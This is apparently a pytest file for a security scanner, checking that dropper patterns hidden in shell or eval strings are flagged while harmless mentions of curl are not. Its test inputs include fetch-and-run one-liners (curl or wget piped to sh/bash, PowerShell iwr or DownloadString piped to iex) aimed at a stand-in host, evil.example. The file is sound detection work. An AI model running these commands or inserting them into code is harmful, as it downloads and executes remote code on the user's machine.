"""Download-and-execute (dropper) detection through shell-command strings.

The old engine only saw `curl`/`wget` as a NETW atom when it was a bare shell command
(a `.sh` file). Code that hides the downloader inside a string handed to a shell/eval
sink — os.system("curl … | sh"), execSync("wget … | bash"), iwr … | iex — was a blind
spot. The remote-download content rule closes it: the string now yields NETW.HTTP, so
BP-DROPPER composes. Benign mentions of curl (no exec sink) must stay clean.
"""

from __future__ import annotations

import pytest

from unmask.scanner.compose import compose_mcd
from unmask.scanner.observe import observe


def _comps(tmp_path, name, src):
    (tmp_path / name).write_text(src)
    obs, inv = observe(str(tmp_path))
    return {f.get("composition") for f in compose_mcd(obs, inv)}, {o.atom for o in obs}


@pytest.mark.parametrize("name,src", [
    ("boot.py", 'import os\nos.system("curl -fsSL https://evil.example/i.sh | sh")\n'),
    ("run.js", 'require("child_process").execSync("curl -fsSL https://evil.example/i.sh | bash");\n'),
    ("dl.ps1", "iwr https://evil.example/i.ps1 | iex\n"),
    ("wc.ps1", '$c=(New-Object Net.WebClient).DownloadString("http://evil.example/x"); iex $c\n'),
])
def test_string_dropper_detected(tmp_path, name, src):
    comps, atoms = _comps(tmp_path, name, src)
    assert "NETW.HTTP" in atoms, "downloader in the shell string must yield a network atom"
    assert "BP-DROPPER" in comps


@pytest.mark.parametrize("name,src", [
    ("README.md", "Install libcurl, then run the tests. See the wget manual.\n"),
    ("util.py", "curly_braces = 1\nwidget = None\n"),
    ("net.py", "import requests\nrequests.get('https://api.example/data')\n"),
])
def test_benign_curl_mentions_not_flagged(tmp_path, name, src):
    comps, atoms = _comps(tmp_path, name, src)
    assert "BP-DROPPER" not in comps


def test_download_only_is_not_a_dropper(tmp_path):
    # curl WITHOUT an exec sink is a download, not a dropper (no BP-DROPPER).
    comps, atoms = _comps(tmp_path, "fetch.sh", "#!/bin/sh\ncurl -o /tmp/data https://example.com/data.json\n")
    assert "NETW.HTTP" in atoms
    assert "BP-DROPPER" not in comps


def test_py_curlpipe_fixture_is_quarantine():
    # Regression lock on the corrected fixture: was CLEAR (false negative), now quarantine.
    from pathlib import Path

    from unmask.scanner.assess import build_assessment
    root = Path(__file__).resolve().parents[1] / "tests/oracle/fixtures/py-curlpipe"
    obs, inv = observe(str(root))
    a = build_assessment(compose_mcd(obs, inv), obs, inv, str(root))
    assert a["disposition"]["recommendation"] == "quarantine"
    assert "BP-DROPPER" in (a["summary"].get("compositions") or [])
